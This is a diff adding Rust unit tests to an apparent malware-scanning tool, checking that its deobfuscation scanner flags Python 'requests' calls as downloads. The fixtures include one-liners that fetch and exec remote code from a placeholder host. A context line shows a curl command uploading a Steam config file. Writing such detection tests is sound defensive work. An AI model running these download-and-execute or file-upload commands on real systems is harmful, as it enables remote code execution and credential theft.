@@ -20848,6 +20848,103 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_requests_post_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; requests.post('https://py.example/requests-post', data='x'); from requests import put as send; send('https://py.example/requests-put-alias'); s = requests.Session(); s.patch('https://py.example/session-patch')""#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://py.example/requests-post",
+            "https://py.example/requests-put-alias",
+            "https://py.example/session-patch",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| {
+                    matches!(
+                        t,
+                        Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                    )
+                }),
+                "no structured Download from Python requests verb {expected}: {:?}",
+                env.traits
+            );
+            assert!(
+                !env.traits.iter().any(|t| {
+                    matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)
+                }),
+                "Python requests verb URL double-emitted: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn python_requests_request_post_keyword_url_ignores_header_literals() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; exec(requests.request(method='POST', headers={'Referer': 'https://py.example/request-post-referer'}, url='https://py.example/request-post-actual').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/request-post-actual" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python requests.request POST keyword URL: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://py.example/request-post-referer"
+                )
+            }),
+            "Python requests.request POST header URL was promoted as structured source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_assigned_post_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; send = requests.post; exec(send('https://py.example/assigned-post').text)""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://py.example/assigned-post" && dst.is_none()
+                )
+            }),
+            "no structured Download from Python assigned requests.post alias: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/assigned-post"
+                )
+            }),
+            "Python assigned requests.post alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_httpx_get_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
